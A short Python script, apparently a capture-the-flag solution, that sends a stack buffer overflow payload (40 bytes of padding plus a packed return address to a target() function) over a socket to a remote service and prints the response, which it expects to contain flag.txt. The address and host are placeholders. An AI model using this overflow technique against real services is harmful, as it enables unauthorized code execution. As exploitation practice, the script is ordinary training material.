import socket
import struct
import time

HOST ="host.example.com"
PORT = 5101

def start_connection():
    print(f"Attempting to connect to {HOST}:{PORT}")

    # 32 bytes for the buffer + 8 bytes for saved RBP
    padding = b"A" * 40

    # Address of the target() function
    target_addr = 0x4XXXXX

    # Pack the address (64LE) and append a new line for vuln()
    payload = padding + struct.pack("<Q", target_addr) + b"\n"

    try:
        # Need to connect to the raw socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10.0)
        s.connect((HOST, PORT))
        print("Connection established.")

        # Receive the initial banner
        banner = s.recv(1024).decode('utf-8', 'ignore')
        print(f"Server: {banner.strip()}")

        # Send the payload
        print("Sending payload...")
        s.sendall(payload)

        # Short sleep to give the remote system time to execute and read flag.txt
        time.sleep(2.5)

        # Receive server response
        response = s.recv(4096).decode('utf-8', 'ignore')
        print("\n Response:")
        print(response.strip())

    except socket.timeout:
        print("Connection timed out.")
    except Exception as e:
        print(f"Failed: {e}")
    finally:
        s.close()
        print("\n Socket closed.")

if __name__ == "__main__":
    start_connection()